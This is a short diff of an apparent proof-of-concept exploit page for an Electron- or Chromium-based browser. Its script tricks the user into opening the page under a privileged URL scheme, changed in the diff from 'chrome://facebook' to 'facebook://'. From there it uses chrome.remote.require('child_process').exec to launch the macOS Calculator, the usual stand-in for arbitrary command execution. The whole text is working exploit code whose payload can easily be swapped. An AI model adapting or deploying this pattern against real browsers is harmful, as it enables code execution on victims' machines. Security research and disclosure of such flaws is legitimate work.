@@ -1,10 +1,10 @@
 <body>
     <script>
-        if (window.location.href.includes('chrome://facebook')) {
+        if (window.location.href.includes('facebook://')) {
             chrome.remote.require('child_process').exec('/Applications/Calculator.app/Contents/MacOS/Calculator')
         } else {
             document.write(
-                `<a target="blank" href="chrome://facebook${window.location.pathname}">Open me using "Open in a new tab"[tab_helper]</a>`
+                `<a target="blank" href="facebook://${window.location.pathname}">Open me using "Open in a new tab"[tab_helper]</a>`
             )
         }
     </script>
